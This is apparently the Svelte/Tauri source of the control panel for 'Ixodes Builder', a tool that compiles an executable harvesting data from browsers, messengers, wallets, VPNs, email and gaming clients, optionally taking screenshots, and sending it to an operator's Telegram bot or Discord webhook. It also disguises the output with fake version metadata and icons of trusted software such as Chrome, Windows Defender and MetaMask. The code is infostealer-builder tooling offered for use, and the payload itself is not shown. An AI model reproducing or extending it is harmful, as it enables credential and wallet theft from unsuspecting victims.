<script lang="ts">
  import { invoke } from "@tauri-apps/api/core";
  import { open } from "@tauri-apps/plugin-dialog";
  import { Button } from "$lib/components/ui/button";
  import { CardContent, CardHeader } from "$lib/components/ui/card";
  import {
    Select,
    SelectItem,
    SelectContent,
    SelectTrigger
  } from "$lib/components/ui/select";
  import { Input } from "$lib/components/ui/input";
  import { Label } from "$lib/components/ui/label";
  import { Separator } from "$lib/components/ui/separator";
  import { Switch } from "$lib/components/ui/switch";
  import { brandingPresets } from "$lib/branding-presets";
  import { toast } from "svelte-sonner";
  import {
    FolderOpen,
    Hammer,
    KeyRound,
    LockKeyhole,
    ListChecks,
    ShieldCheck,
  } from "@lucide/svelte";

  type BuildResult = {
    success: boolean;
    output: string;
    exe_path: string | null;
    moved_to: string | null;
  };

  const categories = [
    { id: "Browsers", label: "Browsers" },
    { id: "Messengers", label: "Messengers" },
    { id: "Gaming", label: "Gaming" },
    { id: "EmailClients", label: "Email Clients" },
    { id: "VPNs", label: "VPNs" },
    { id: "Wallets", label: "Wallets" },
    { id: "System", label: "System" },
    { id: "Other", label: "Other" },
  ] as const;

  const iconPresets = [
    { id: "none", label: "None" },
    { id: "tauri-default", label: "Tauri default" },
    { id: "adobe-acrobat-reader", label: "Adobe Acrobat Reader" },
    { id: "binance", label: "Binance" },
    { id: "brave", label: "Brave" },
    { id: "chrome", label: "Google Chrome" },
    { id: "cs2", label: "CS2" },
    { id: "discord", label: "Discord" },
    { id: "dropbox", label: "Dropbox" },
    { id: "edge", label: "Microsoft Edge" },
    { id: "epicgames", label: "Epic Games Launcher" },
    { id: "firefox", label: "Mozilla Firefox" },
    { id: "google-drive", label: "Google Drive" },
    { id: "java", label: "Java Runtime Environment" },
    { id: "metamask", label: "MetaMask" },
    { id: "nvidia", label: "NVIDIA Control Panel" },
    { id: "onedrive", label: "Microsoft OneDrive" },
    { id: "opera", label: "Opera" },
    { id: "paypal", label: "PayPal" },
    { id: "rs6", label: "Rainbow Six Siege" },
    { id: "steam", label: "Steam" },
    { id: "teams", label: "Microsoft Teams" },
    { id: "telegram", label: "Telegram" },
    { id: "vlc", label: "VLC Media Player" },
    { id: "windows-defender", label: "Windows Defender" },
    { id: "windows", label: "Windows" },
    { id: "word", label: "Microsoft Word" },
    { id: "zoom", label: "Zoom" },
  ] as const;

  let archivePassword = $state("");
  let telegramToken = $state("");
  let telegramChatId = $state("");
  let discordWebhook = $state("");
  let commMode = $state<"telegram" | "discord">("telegram");
  let telegramChecked = $state(true);
  let discordChecked = $state(false);
  let outputDir = $state("");
  let iconSource = $state("");
  let iconPreset = $state("none");
  let productName = $state("");
  let fileDescription = $state("");
  let companyName = $state("");
  let productVersion = $state("");
  let fileVersion = $state("");
  let copyright = $state("");
  let categoryState = $state<Record<string, boolean>>(
    Object.fromEntries(categories.map((category) => [category.id, true]))
  );
  let captureScreenshots = $state(false);

  let buildStatus = $state<"idle" | "loading" | "success" | "error">("idle");
  let buildError = $state("");
  let movedTo = $state("");
  let successTimer: ReturnType<typeof setTimeout> | null = null;

  const selectedCategories = () =>
    categories.filter((category) => categoryState[category.id]).map((category) => category.id);

  const telegramTokenValid = $derived(
    telegramToken.trim().length === 0
      ? true
      : /^\d+:[A-Za-z0-9_-]{20,}$/.test(telegramToken.trim())
  );
  const telegramChatIdValid = $derived(
    telegramChatId.trim().length === 0 ? true : /^-?\d+$/.test(telegramChatId.trim())
  );
  const discordWebhookValid = $derived(
    discordWebhook.trim().length === 0
      ? true
      : /^https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+$/.test(
          discordWebhook.trim()
        )
  );

  let selectedCategoryCount = $derived(selectedCategories().length);
  let hasCommunication = $derived(Boolean(commMode));
  let canBuild = $derived(selectedCategoryCount > 0 && hasCommunication);

  $effect(() => {
    if (iconPreset !== "none" && iconSource.trim().length > 0) {
      iconSource = "";
    }
  });

  $effect(() => {
    if (iconSource.trim().length > 0 && iconPreset !== "none") {
      iconPreset = "none";
    }
  });

  $effect(() => {
    telegramChecked = commMode === "telegram";
    discordChecked = commMode === "discord";
  });

  const showToast = (message: string, title = "Notice", type: "info" | "error" = "info") => {
    if (type === "error") {
      toast.error(title, { description: message });
    } else {
      toast.message(title, { description: message });
    }
  };

  const toggleCategory = (id: string, checked: boolean) => {
    if (!checked && selectedCategories().length <= 1 && categoryState[id]) {
      showToast("At least one category must stay enabled.");
      return;
    }
    categoryState = { ...categoryState, [id]: checked };
  };

  const isCommInactive = (mode: "telegram" | "discord") => commMode !== mode;

  const generateArtifactKey = () => {
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    let binary = "";
    for (const byte of bytes) {
      binary += String.fromCharCode(byte);
    }
    return btoa(binary);
  };

  const chooseOutputDir = async () => {
    const result = await open({
      directory: true,
      multiple: false,
      title: "Select output folder",
    });
    if (!result) return;
    if (Array.isArray(result)) {
      outputDir = result[0] ?? "";
    } else {
      outputDir = result;
    }
  };

  const chooseIconFile = async () => {
    const result = await open({
      directory: false,
      multiple: false,
      title: "Select icon file",
      filters: [
        { name: "Icons", extensions: ["ico", "icns", "png"] },
      ],
    });
    if (!result) return;
    if (Array.isArray(result)) {
      iconSource = result[0] ?? "";
    } else {
      iconSource = result;
    }
  };

  const runBuild = async () => {
    if (!canBuild) {
      const message = !hasCommunication
        ? "Select Telegram or Discord before building."
        : "Select at least one category before building.";
      buildStatus = "error";
      buildError = message;
      showToast(message, "Build failed", "error");
      return;
    }
    buildStatus = "loading";
    buildError = "";
    movedTo = "";
    if (successTimer) {
      clearTimeout(successTimer);
      successTimer = null;
    }
    try {
          const result = (await invoke("build_ixodes", {
            request: {
              settings: {
                allowed_categories: selectedCategories(),
                artifact_key: generateArtifactKey(),
                archive_password: archivePassword,
                telegram_token: telegramToken,
                telegram_chat_id: telegramChatId,
                discord_webhook: discordWebhook,
                capture_screenshots: captureScreenshots,
              },
              branding: {
                icon_source: iconSource,
                icon_preset: iconPreset,
                product_name: productName,
                file_description: fileDescription,
                company_name: companyName,
                product_version: productVersion,
                file_version: fileVersion,
                copyright,
              },
              output_dir: outputDir,
            },
          })) as BuildResult;
      movedTo = result.moved_to ?? "";
      buildStatus = result.success ? "success" : "error";
      if (!result.success) {
        buildError = "Build failed. Check the output for details.";
        showToast(buildError, "Build failed", "error");
      } else {
        successTimer = setTimeout(() => {
          buildStatus = "idle";
          successTimer = null;
        }, 5000);
      }
    } catch (error) {
      buildStatus = "error";
      buildError = String(error);
      showToast(buildError, "Build failed", "error");
    }
  };

  const generateBranding = () => {
    const preset =
      brandingPresets[Math.floor(Math.random() * brandingPresets.length)];
    productName = preset.productName;
    fileDescription = preset.fileDescription;
    companyName = preset.companyName;
    productVersion = preset.productVersion;
    fileVersion = preset.fileVersion;
    copyright = preset.copyright;
    iconSource = "";
    iconPreset = preset.iconPreset;
  };
</script>

<main class="dark min-h-screen bg-background text-foreground flex flex-col gap-6 pt-6 pb-4">
  
  <CardHeader class="space-y-4 border-b border-border/60">
    <div class="flex items-center justify-between gap-4">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <ShieldCheck class="h-4 w-4 text-primary" />
        Ixodes Builder
      </div>
    </div>
  </CardHeader>
  <CardContent class="space-y-10">
    <div class="space-y-4">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <ListChecks class="h-4 w-4 text-primary" />
        Enabled categories
      </div>
      <p class="text-xs text-muted-foreground">
        Toggle categories to include. At least one category is required.
      </p>
      <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
        {#each categories as category}
          <div
            class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
            role="button"
            tabindex="0"
            onclick={(event) => {
              const target = event.target as HTMLElement | null;
              if (target?.closest?.("[data-category-switch]")) return;
              toggleCategory(category.id, !categoryState[category.id]);
            }}
            onkeydown={(event) => {
              if (event.key === "Enter" || event.key === " ") {
                event.preventDefault();
                toggleCategory(category.id, !categoryState[category.id]);
              }
            }}
          >
            <Label class="text-sm">{category.label}</Label>
            <Switch
              id={`category-${category.id}`}
              data-category-switch
              class="cursor-pointer"
              checked={categoryState[category.id]}
              onclick={(event) => {
                if (categoryState[category.id] && selectedCategoryCount <= 1) {
                  event.preventDefault();
                  event.stopPropagation();
                  showToast("At least one category must stay enabled.");
                }
              }}
              onCheckedChange={(checked) => toggleCategory(category.id, Boolean(checked))}
            />
          </div>
        {/each}
      </div>
    </div>

    <div class="space-y-3">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <ShieldCheck class="h-4 w-4 text-primary" />
        Screen capture
      </div>
      <div class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/20 px-4 py-3 text-sm">
        <div>
          <p class="text-sm font-semibold">Capture screenshots</p>
          <p class="text-xs text-muted-foreground">
            Saves a screenshot of each connected monitor during recovery.
          </p>
        </div>
        <Switch bind:checked={captureScreenshots} />
      </div>
    </div>

    <div class="space-y-4">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <FolderOpen class="h-4 w-4 text-primary" />
        Communication
      </div>
      <p class="text-xs text-muted-foreground">
        Choose exactly one destination for sending recovery artifacts.
      </p>
      <div class="grid gap-4 md:grid-cols-2">
        <div
          class={`space-y-3 rounded-md border border-border/70 bg-muted/20 p-4 transition ${commMode === "telegram" ? "border-primary/70 bg-primary/5" : ""} ${isCommInactive("telegram") ? "cursor-pointer opacity-50" : ""}`}
          role="button"
          tabindex="0"
          onclick={() => {
            if (commMode !== "telegram") {
              commMode = "telegram";
            }
          }}
          onkeydown={(event) => {
            if (commMode === "telegram") return;
            if (event.key === "Enter" || event.key === " ") {
              event.preventDefault();
              commMode = "telegram";
            }
          }}
        >
          <div class="flex items-center justify-between gap-3">
            <div>
              <p class="text-sm font-semibold">Telegram</p>
              <p class="text-xs text-muted-foreground">Token + chat ID</p>
            </div>
            <Switch
              bind:checked={telegramChecked}
              onclick={(event) => event.stopPropagation()}
              onCheckedChange={(checked) => {
                commMode = checked ? "telegram" : "discord";
              }}
            />
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="telegram-token">
              Telegram Token
            </Label>
            <Input
              id="telegram-token"
              placeholder="123456789:ABC..."
              bind:value={telegramToken}
              disabled={commMode !== "telegram"}
              class={`${commMode !== "telegram" ? "pointer-events-none" : ""} ${!telegramTokenValid && commMode === "telegram" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
            />
            {#if commMode === "telegram"}
              <p class="text-xs text-muted-foreground">
                Format: bot token like <span class="font-mono">123456789:ABCDEF...</span>
              </p>
            {/if}
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="telegram-chat-id">
              Telegram Chat ID
            </Label>
            <Input
              id="telegram-chat-id"
              placeholder="123456789"
              bind:value={telegramChatId}
              disabled={commMode !== "telegram"}
              class={`${commMode !== "telegram" ? "pointer-events-none" : ""} ${!telegramChatIdValid && commMode === "telegram" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
            />
            {#if commMode === "telegram"}
              <p class="text-xs text-muted-foreground">
                Numeric chat ID (e.g. <span class="font-mono">123456789</span> or <span class="font-mono">-1001234567890</span>).
              </p>
            {/if}
          </div>
        </div>
        <div
          class={`space-y-3 rounded-md border border-border/70 bg-muted/20 p-4 transition ${commMode === "discord" ? "border-primary/70 bg-primary/5" : ""} ${isCommInactive("discord") ? "cursor-pointer opacity-50" : ""}`}
          role="button"
          tabindex="0"
          onclick={() => {
            if (commMode !== "discord") {
              commMode = "discord";
            }
          }}
          onkeydown={(event) => {
            if (commMode === "discord") return;
            if (event.key === "Enter" || event.key === " ") {
              event.preventDefault();
              commMode = "discord";
            }
          }}
        >
          <div class="flex items-center justify-between gap-3">
            <div>
              <p class="text-sm font-semibold">Discord</p>
              <p class="text-xs text-muted-foreground">Webhook URL</p>
            </div>
            <Switch
              bind:checked={discordChecked}
              onclick={(event) => event.stopPropagation()}
              onCheckedChange={(checked) => {
                commMode = checked ? "discord" : "telegram";
              }}
            />
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="discord-webhook">
              Discord Webhook URL
            </Label>
            <Input
              id="discord-webhook"
              placeholder="https://discord.com/api/webhooks/..."
              bind:value={discordWebhook}
              disabled={commMode !== "discord"}
              class={`${commMode !== "discord" ? "pointer-events-none" : ""} ${!discordWebhookValid && commMode === "discord" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
            />
            {#if commMode === "discord"}
              <p class="text-xs text-muted-foreground">
                Full webhook URL like <span class="font-mono">https://discord.com/api/webhooks/…</span>
              </p>
            {/if}
          </div>
        </div>
      </div>
    </div>

    <div class="space-y-3">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <LockKeyhole class="h-4 w-4 text-primary" />
        Archive Password
      </div>
      <Input
        id="archive-password"
        placeholder="Archive password (optional)"
        bind:value={archivePassword}
      />
    </div>

    <div class="space-y-4">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <KeyRound class="h-4 w-4 text-primary" />
        Executable branding
      </div>
      <div class="flex flex-wrap items-center justify-between gap-3">
        <p class="text-xs text-muted-foreground">
          Windows embeds icon and version metadata into the executable. macOS/Linux apply only
          when packaging an app bundle. Preset icons are embedded in the builder. Icons must be
          square and between 256x256 and 512x512.
        </p>
        <Button variant="outline" size="sm" onclick={generateBranding}>
          Generate Random
        </Button>
      </div>
      <div class="grid gap-4 md:grid-cols-2">
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="product-name">
            Product name
          </Label>
          <Input id="product-name" placeholder="Ixodes" bind:value={productName} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="file-description">
            File description
          </Label>
          <Input id="file-description" placeholder="Recovery toolkit" bind:value={fileDescription} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="company-name">
            Company name
          </Label>
          <Input id="company-name" placeholder="Acme Labs" bind:value={companyName} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="product-version">
            Product version
          </Label>
          <Input id="product-version" placeholder="1.0.0.0" bind:value={productVersion} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="file-version">
            File version
          </Label>
          <Input id="file-version" placeholder="1.0.0.0" bind:value={fileVersion} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="copyright">
            Copyright
          </Label>
          <Input id="copyright" placeholder="© 2026 Example Co." bind:value={copyright} />
        </div>
      </div>
      <div class="grid w-full items-start gap-3 md:grid-cols-[minmax(180px,0.35fr)_minmax(0,1fr)]">
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="icon-preset">
            Preset icon
          </Label>
          <Select
            type="single"
            bind:value={iconPreset}
            disabled={iconSource.trim().length > 0}
          >
            <SelectTrigger id="icon-preset" class="w-full">
              <span>{iconPreset}</span>
            </SelectTrigger>
            <SelectContent>
              {#each iconPresets as preset (preset.id)}
                <SelectItem value={preset.id}>{preset.label}</SelectItem>
              {/each}
            </SelectContent>
          </Select>
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground">Custom icon</Label>
          <div class="grid gap-3 md:grid-cols-[1fr_auto]">
            <Input
              placeholder="Icon URL, file path, or directory"
              bind:value={iconSource}
              disabled={iconPreset !== "none"}
            />
            <Button variant="outline" onclick={chooseIconFile} disabled={iconPreset !== "none"}>
              Choose icon
            </Button>
          </div>
        </div>
      </div>
    </div>

    <Separator />

    <div class="sticky bottom-4 z-40 -mx-4 rounded-lg border border-border/70 bg-background/95 px-4 py-4 shadow-lg backdrop-blur">
      <div class="flex flex-wrap items-center justify-between gap-4">
        <Button
          size="lg"
          class={`gap-2 transition-colors ${buildStatus === "success" ? "bg-emerald-500 text-white hover:bg-emerald-500" : ""}`}
          onclick={runBuild}
          disabled={buildStatus === "loading" || !canBuild}
        >
          <Hammer class="h-4 w-4" />
          {buildStatus === "loading"
            ? "Building..."
            : buildStatus === "success"
              ? "Success"
              : "Build release"}
        </Button>
        <div class="text-xs text-muted-foreground">
          <div class="flex items-center gap-2">
            <span class={hasCommunication ? "text-emerald-500" : "text-destructive"}>
              {hasCommunication ? "Communication set" : "Select Telegram or Discord"}
            </span>
            <span class="text-muted-foreground">•</span>
            <span class={selectedCategoryCount > 0 ? "text-emerald-500" : "text-destructive"}>
              {selectedCategoryCount > 0 ? `${selectedCategoryCount} categories` : "Pick a category"}
            </span>
          </div>
        </div>
        <div class="grid gap-3 md:grid-cols-[1fr_auto]">
          <Input
            placeholder="Defaults to Desktop"
            bind:value={outputDir}
          />
          <Button variant="outline" onclick={chooseOutputDir}>
            Choose folder
          </Button>
        </div>
      </div>
    </div>
  </CardContent>
</main>
